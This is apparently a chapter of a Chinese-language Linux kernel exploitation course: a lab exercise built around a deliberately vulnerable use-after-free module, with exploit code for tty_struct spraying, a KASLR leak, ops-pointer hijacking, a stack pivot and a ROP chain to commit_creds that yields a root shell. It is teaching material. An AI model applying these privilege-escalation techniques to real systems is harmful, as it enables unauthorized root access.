# 練習 B — UAF → tty_struct ops hijack 完整鏈

> 目標：從一個 `kmalloc-1024` 的 UAF 出發，spray `tty_struct`、hijack `->ops`、控 RIP、繞 SMEP/SMAP/KPTI/KASLR 拿 root。整合 Ch 10-12。

## 前置條件

- 完成 Ch 10（UAF / SLUB freelist corruption）
- 完成 Ch 11（heap spray 物件）
- 完成 Ch 12（heap to RIP control）
- 完成練習 A（至少走過一次 stack overflow → root 的完整鏈）

## Vulnerable Module

```c
/* vuln_b.c：kmalloc-1024 UAF，讓 tty_struct spray 命中 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>

#define B_ALLOC  _IO('B', 1)
#define B_FREE   _IO('B', 2)
#define B_READ   _IOR('B', 3, unsigned long)
#define B_WRITE  _IOW('B', 4, unsigned long)
#define CHUNK_SZ 1024

static char *g_buf = NULL;

static long b_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case B_ALLOC:
        kfree(g_buf);   /* 先 free，再 alloc（讓你可以重複 alloc） */
        g_buf = kzalloc(CHUNK_SZ, GFP_KERNEL);
        return 0;
    case B_FREE:
        kfree(g_buf);   /* dangling：不清 NULL */
        return 0;
    case B_READ:
        if (copy_to_user((void __user *)arg, g_buf, CHUNK_SZ)) return -EFAULT;
        return 0;
    case B_WRITE:
        if (copy_from_user(g_buf, (void __user *)arg, CHUNK_SZ)) return -EFAULT;
        return 0;
    }
    return -EINVAL;
}

static struct file_operations b_fops = { .unlocked_ioctl = b_ioctl };
static struct miscdevice b_dev = {
    .minor = MISC_DYNAMIC_MINOR, .name = "vuln_b", .fops = &b_fops,
};
static int __init m_init(void) { return misc_register(&b_dev); }
static void __exit m_exit(void) { misc_deregister(&b_dev); }
module_init(m_init); module_exit(m_exit);
MODULE_LICENSE("GPL");
```

## 任務拆解

### Task 1：環境準備（30 分鐘）

1. 編譯 `vuln_b.ko`，載入到 Ch 0 的 QEMU 環境
2. 確認 QEMU 開 SMEP + SMAP + KPTI + KASLR（boot command line）
3. 準備 `save_user_regs()` 和 `pin_cpu(0)` 的 helper

### Task 2：UAF 觸發與驗證（45 分鐘）

```c
int fd = open("/dev/vuln_b", O_RDWR);
ioctl(fd, B_ALLOC, 0);   /* alloc chunk */
ioctl(fd, B_FREE, 0);    /* free，dangling pointer */

/* 立刻 spray tty_struct */
int tty_fds[64];
for (int i = 0; i < 64; i++)
    tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

/* 讀 dangling chunk — 如果 tty_struct 命中，內容是 tty_struct 的欄位 */
char buf[1024];
ioctl(fd, B_READ, (unsigned long)buf);

/* 檢查 magic：tty_struct.magic = 0x5401 */
if (*(int *)buf == 0x5401)
    printf("[*] tty_struct captured!\n");
```

**驗證**：用 GDB 在 QEMU 裡找 `tty_struct` 的 address，確認和你讀到的內容一致。

### Task 3：KASLR bypass（1 小時）

`tty_struct->ops` 是一個指向 kernel `.rodata` 的 pointer（`tty_ldisc_ops` 或 `tty_operations`）。從 dangling read 拿到這個 pointer，減去 symbol 的已知 offset，算出 kernel base。

```c
uint64_t *chunk = (uint64_t *)buf;
/* tty_struct layout（6.x）：
 * +0:   magic (int)
 * +8:   dev / kref
 * +16:  driver
 * +24:  ops    ← 指向 tty_operations（kernel .rodata）
 */
uint64_t ops_ptr = chunk[3];  /* offset +24 / 8 = index 3 */
uint64_t kernel_base = ops_ptr - TTY_OPERATIONS_OFFSET;
printf("[*] kernel_base = %#lx\n", kernel_base);
```

`TTY_OPERATIONS_OFFSET` 用 `readelf -s vmlinux | grep tty_operations` 算出，加上 KASLR slide 就是真實地址。

### Task 4：fake_ops 準備（1 小時）

```c
struct tty_operations fake_ops;
memset(&fake_ops, 0, sizeof(fake_ops));

/* pivot gadget：mov rsp, rdx ; ret（cmd 參數作為 pivot 目標） */
uint64_t pivot_gadget = kernel_base + PIVOT_OFFSET;
fake_ops.ioctl = (void *)pivot_gadget;

/* 把 fake_ops 放進 user-space（SMEP 開著，kernel 不能執行 user page） */
/* 改放到 kernel 裡：用 user_key_payload 噴 fake_ops 進 kernel */
/* 或把 fake_ops 的地址放進 tty_struct 被替換的 ops，
   讓 ops 指向 kernel 裡的 fake_ops（你事先 spray 進去的） */
```

**更常見的方法**：先 spray `user_key_payload` 把 fake ROP chain 放進 kernel，再讓 fake_ops.ioctl 指向一個 pivot gadget，把 RSP 搬到 fake ROP chain 地址。

### Task 5：UAF write + trigger（45 分鐘）

```c
/* 構造 payload：替換 tty_struct->ops 為 fake_ops 的 kernel address */
memcpy(buf, &original_tty_struct, sizeof(buf));  /* 先複製原始內容 */
*(uint64_t *)(buf + 24) = fake_ops_kaddr;         /* 替換 ops */

ioctl(fd, B_WRITE, (unsigned long)buf);  /* UAF write */

/* trigger：呼叫被 hijack 的 ioctl */
ioctl(tty_fds[victim_idx],
      fake_stack_kaddr,   /* cmd → rdx → pivot target */
      0);
```

### Task 6：ROP chain 到 root（45 分鐘）

```c
uint64_t fake_stack[32];
int i = 0;
fake_stack[i++] = kernel_base + POP_RDI_RET;
fake_stack[i++] = 0;
fake_stack[i++] = kernel_base + PREPARE_KERNEL_CRED;
fake_stack[i++] = kernel_base + MOV_RDI_RAX_RET;
fake_stack[i++] = kernel_base + COMMIT_CREDS;
fake_stack[i++] = kernel_base + SWAPGS_RESTORE + OFFSET;
fake_stack[i++] = 0; fake_stack[i++] = 0;  /* dummy */
/* ... iretq frame ... */
fake_stack[i++] = (uint64_t)win_shell;
fake_stack[i++] = USER_CS;
fake_stack[i++] = USER_RFLAGS;
fake_stack[i++] = (uint64_t)user_stack_top;
fake_stack[i++] = USER_SS;
```

## 除錯 checklist

- [ ] `tty_struct.magic == 0x5401`：spray 有命中
- [ ] `ops_ptr - TTY_OPERATIONS_OFFSET` 算出的 `kernel_base` 後 12-bit 是 0（KASLR align）
- [ ] `fake_ops.ioctl` 的 pivot gadget 在 vmlinux 用 `ropper` 找到
- [ ] `USER_CS / USER_SS / USER_RFLAGS / USER_SP` 在進 exploit 前用 inline asm 存好
- [ ] `SWAPGS_RESTORE` 跳到 `pop rax` 那行而不是函式入口

## 目標達成條件

跑 exploit 後取得 `uid=0` 的 root shell。再試三次確認成功率 > 50%。

## 進階挑戰

1. **把 prepare_kernel_cred 換成 data-only**：不走 ROP，用 UAF 直接改 cred struct 的 uid 欄位。
2. **加重試機制**：當 exploit 失敗（crash 前被偵測到）時自動重試 3 次。
3. **pin 前後比較**：不加 `sched_setaffinity` 跑 10 次，加了跑 10 次，記錄成功率差異。

→ [練習 C：Cross-cache → Dirty Pagetable 綜合題](./practice-c-cross-cache-dirty-pagetable.md)
